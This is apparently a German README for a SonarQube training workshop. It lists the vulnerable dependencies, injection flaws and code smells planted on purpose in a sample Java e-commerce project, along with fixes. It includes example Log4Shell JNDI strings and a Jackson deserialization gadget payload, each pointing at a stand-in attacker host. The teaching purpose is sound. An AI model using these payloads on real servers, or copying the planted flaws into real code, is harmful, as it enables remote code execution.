# SonarQube Workshop - Code-Beispiel mit typischen Fehlern

## Übersicht
Dieses E-Commerce-Beispiel demonstriert reale Code-Probleme, die SonarQube erkennen würde.

## 🔥 VULNERABLE DEPENDENCIES (pom.xml)

### 1. Log4j 2.14.1 - CVE-2021-44228 (Log4Shell) ⚠️ KRITISCH
**Das Problem:**
- Remote Code Execution durch JNDI Lookup
- Angreifer kann durch spezielle Strings beliebigen Code ausführen
- Beispiel: `${jndi:ldap://attacker.com/evil}` in Logs

**Im Code verwendet:**
- `UserService.java` Zeile 38: User-Input wird direkt geloggt
- `FileUploadController.java` Zeile 40, 46: Dateinamen werden geloggt

**Exploit-Szenario:**
```java
logger.info("User email: " + email);
// Wenn email = "${jndi:ldap://evil.com/Exploit}"
// → Server lädt und führt Exploit-Code aus!
```

**Fix:** 
```xml
<version>2.17.1</version> <!-- oder höher -->
```

### 2. Jackson Databind 2.9.8 - Multiple CVEs ⚠️ KRITISCH
**Das Problem:**
- CVE-2019-12384, CVE-2019-12814, CVE-2019-14540
- Deserialization Attacks möglich
- Angreifer kann durch manipulierte JSON-Daten Code ausführen

**Im Code verwendet:**
- `UserService.java` Zeile 131-140: `deserializeUser()` Methode
- `enableDefaultTyping()` macht es besonders gefährlich!

**Exploit-Szenario:**
```json
["com.sun.rowset.JdbcRowSetImpl", {
  "dataSourceName":"ldap://attacker.com/Exploit",
  "autoCommit":true
}]
```

**Fix:**
```xml
<version>2.15.0</version> <!-- oder höher -->
```

### 3. Apache Commons FileUpload 1.3.1 - CVE-2016-1000031 ⚠️ HOCH
**Das Problem:**
- Denial of Service durch unbegrenzte Datei-Uploads
- Kein Memory-Limit bei Dateiverarbeitung
- Server kann durch große Dateien zum Absturz gebracht werden

**Im Code verwendet:**
- `FileUploadController.java` Zeile 22-35
- Keine `setFileSizeMax()` oder `setSizeMax()` Limits!

**Fix:**
```xml
<version>1.5</version>
```

### 4. Spring Framework 4.3.18 - CVE-2018-15756, CVE-2020-5398 ⚠️ KRITISCH
**Das Problem:**
- Directory Traversal möglich
- Unauthorized Access zu Ressourcen

**Fix:**
```xml
<version>5.3.20</version>
```

### 5. Apache Commons Collections 3.2.1 ⚠️ DEPRECATED
**Das Problem:**
- Unsichere Deserialisierung
- Version 3.x nicht mehr gewartet

**Im Code verwendet:**
- `UserService.java` Zeile 23: `HashedMap` als Cache

**Fix:**
```xml
<groupId>org.apache.commons</groupId>
<artifactId>commons-collections4</artifactId>
<version>4.4</version>
```

### 6. MySQL Connector/J 5.1.42 - CVE-2018-3258 ⚠️ MITTEL
**Das Problem:**
- Privilege Escalation
- Unsichere SSL-Verbindungen

**Fix:**
```xml
<version>8.0.28</version>
```

---

## Erkannte Probleme nach Kategorie

### 🔴 CRITICAL - Security Vulnerabilities

1. **SQL Injection** (UserService.java, Zeile 26-27)
   - String-Konkatenation in SQL-Query
   - Fix: PreparedStatement verwenden

2. **Hardcoded Credentials** (UserService.java, Zeile 18)
   - Passwort im Code gespeichert
   - Fix: Configuration/Environment Variables nutzen

3. **Plaintext Password Storage** (UserService.java, Zeile 30)
   - Passwörter unverschlüsselt in DB
   - Fix: Bcrypt/Argon2 für Hashing

4. **Password Exposure** (User.java, Zeile 51-53)
   - Getter für Passwort vorhanden
   - Fix: Getter entfernen

### 🟠 MAJOR - Bugs & Code Smells

5. **Resource Leak** (UserService.java, Zeile 24-33)
   - ResultSet und Statement nicht geschlossen
   - Fix: try-with-resources verwenden

6. **Null Pointer Exception** (UserService.java, Zeile 71-74)
   - Keine Null-Prüfung vor Zugriff
   - Fix: Optional<> oder null-check

7. **Empty Catch Block** (UserService.java, Zeile 105-112)
   - Exception wird verschluckt
   - Fix: Logging oder Re-throw

8. **Missing equals()** (UserService.java, Zeile 115-118)
   - hashCode() ohne equals() überschrieben
   - Fix: Beide implementieren

9. **Array Index Out of Bounds** (UserService.java, Zeile 150-153)
   - Kein Check auf Array-Länge
   - Fix: Length-Prüfung oder Optional

10. **Returning null from Collection** (OrderRepository.java, Zeile 27)
    - Collections sollten nie null sein
    - Fix: Collections.emptyList() zurückgeben

### 🟡 MEDIUM - Maintainability Issues

11. **Cognitive Complexity** (UserService.java, Zeile 36-60)
    - Zu viele verschachtelte if-Statements
    - SonarQube Limit: ~15, hier deutlich höher
    - Fix: Early returns, Guard Clauses

12. **Code Duplication** (UserService.java, Zeile 36-60 und 63-77)
    - Ähnliche Validierungslogik dupliziert
    - Fix: Gemeinsame Methode extrahieren

13. **Inefficient String Concatenation** (UserService.java, Zeile 121-128)
    - String += in Schleife
    - Fix: StringBuilder verwenden

14. **Magic Numbers** (UserService.java, Zeile 84-90)
    - Zahlen ohne Bedeutung (10, 500.00, 65, 25)
    - Fix: Konstanten definieren

15. **Dead Code** (UserService.java, Zeile 79-81)
    - Methode wird nie aufgerufen
    - Fix: Entfernen oder nutzen

16. **Commented-out Code** (UserService.java, Zeile 159-162)
    - Alter Code auskommentiert
    - Fix: Löschen (Version Control nutzen)

17. **Too Many Parameters** (UserService.java, Zeile 141-144)
    - 14 Parameter - schwer zu nutzen
    - Fix: Parameter Object Pattern

18. **Flag Argument** (UserService.java, Zeile 156-162)
    - Boolean-Parameter ändert Verhalten komplett
    - Fix: Zwei separate Methoden

### 🔵 INFO - Design Problems

19. **Circular Dependency** (UserService.java ↔ OrderRepository.java)
    - UserService braucht OrderRepository
    - OrderRepository braucht UserService
    - Fix: Architektur refactoring, Events verwenden

20. **Broken Encapsulation** (User.java, Zeile 12-13)
    - Public fields statt private mit getters
    - Fix: Fields private machen

21. **Mutable Static Field** (UserService.java, Zeile 131)
    - Static List ist veränderbar
    - Fix: Immutable Collection oder Synchronization

22. **Thread Safety Issue** (OrderRepository.java, Zeile 34-36)
    - HashMap nicht thread-safe
    - Fix: ConcurrentHashMap oder synchronized

23. **Mutable Array Return** (User.java, Zeile 96-98)
    - Array kann von außen verändert werden
    - Fix: Kopie zurückgeben oder List verwenden

24. **Mutable Date Return** (User.java, Zeile 104-106)
    - Date ist mutable
    - Fix: Kopie zurückgeben oder LocalDateTime

25. **Parameter Reassignment** (UserService.java, Zeile 136-143)
    - Parameter wird überschrieben
    - Fix: Lokale Variable verwenden

26. **Poor Exception Handling** (OrderRepository.java, Zeile 22)
    - printStackTrace() statt Logger
    - Fix: Proper Logging Framework

27. **Missing Validation** (User.java, diverse Setter)
    - Keine Input-Validierung
    - Fix: Bean Validation oder manuelle Checks

## Zyklische Abhängigkeiten - Das komplexe Problem

### Warum schwer zu lösen?

Die Circular Dependency zwischen `UserService` und `OrderRepository` ist besonders interessant:

```
UserService 
    └── benötigt OrderRepository (Constructor Injection)
         └── benötigt UserService (Setter Injection)
              └── benötigt OrderRepository...
```

### Evolution des Problems:

**Phase 1**: Ursprünglich einfach
```java
UserService → OrderRepository
```

**Phase 2**: Feature-Addition
- "Wir brauchen User-Info in OrderRepository"
- Schnelle Lösung: Setter für UserService

**Phase 3**: Weiteres Wachstum
- OrderService wird hinzugefügt
- Braucht sowohl User als auch Order
- Zyklus wird größer

### Lösungsansätze:

1. **Events/Message Bus** (Clean, aber Overhead)
2. **Service Layer Refactoring** (Gemeinsamer Service)
3. **Repository Pattern richtig** (Repositories sollten nur Daten laden)
4. **Dependency Inversion** (Interface dazwischen)

## SonarQube Metriken

Erwartete Ratings:
- **Security**: E (mehrere Vulnerabilities)
- **Reliability**: D (mehrere Bugs)
- **Maintainability**: D (hohe Technical Debt)
- **Coverage**: N/A (keine Tests)
- **Duplications**: ~15%

## Workshop-Übungen

### Dependency Security Check
```bash
# OWASP Dependency Check ausführen
mvn dependency-check:check

# Nur Dependency-Analyse
mvn versions:display-dependency-updates

# SonarQube mit Dependency Check
mvn clean verify sonar:sonar
```

### Übungen nach Schwierigkeit

1. **Anfänger**: Magic Numbers und Dead Code entfernen
2. **Fortgeschritten**: SQL Injection und Resource Leaks fixen
3. **Experte**: Cognitive Complexity reduzieren, Circular Dependency auflösen
4. **Security**: Alle Dependencies aktualisieren und Exploits verstehen
5. **Architektur**: Gesamtes Design überarbeiten

## Realitätsbezug

Dieses Beispiel ist typisch für:
- Legacy Code in gewachsenen Projekten
- Schnelle Prototypen die produktiv wurden
- Code ohne Code Review
- Teams ohne automatische Quality Gates
- Projekte unter Zeit- und Kostendruck
- **Veraltete Dependencies, weil "es läuft ja noch"**
- **Log4Shell hat genau so echte Systeme kompromittiert!**

**Wichtig**: In realen Projekten sieht man oft ALLE diese Probleme gleichzeitig!

### Bekannte Vorfälle durch diese Vulnerabilities:

**Log4Shell (2021):**
- Millionen Server weltweit betroffen
- Minecraft-Server als Entry Point
- Apple iCloud, Steam, Twitter betroffen
- Geschätzter Schaden: Milliarden $

**Jackson Deserialization:**
- Viele Enterprise-Anwendungen verwundbar
- Remote Code Execution in Java-Apps
- Teil vieler APT-Angriffe

**Commons FileUpload:**
- DoS-Angriffe auf Web-Applikationen
- Server-Crashes durch Upload-Floods

## Tool-Integration für den Workshop

### SonarQube Setup
```bash
# SonarQube starten (Docker)
docker run -d --name sonarqube -p 9000:9000 sonarqube:latest

# Projekt analysieren
mvn clean verify sonar:sonar \
  -Dsonar.projectKey=ecommerce-workshop \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login=YOUR_TOKEN
```

### OWASP Dependency Check
```bash
# Report generieren
mvn dependency-check:check

# Report ansehen
open target/dependency-check-report.html
```

### Was SonarQube erkennen wird:
- ✅ Alle Code Smells (27+)
- ✅ Security Hotspots (SQL Injection, etc.)
- ✅ Bugs (NPE, Resource Leaks)
- ✅ Vulnerable Dependencies (mit entsprechendem Plugin)
- ✅ Code Coverage (0% - keine Tests!)
- ✅ Technical Debt (~2+ Tage)
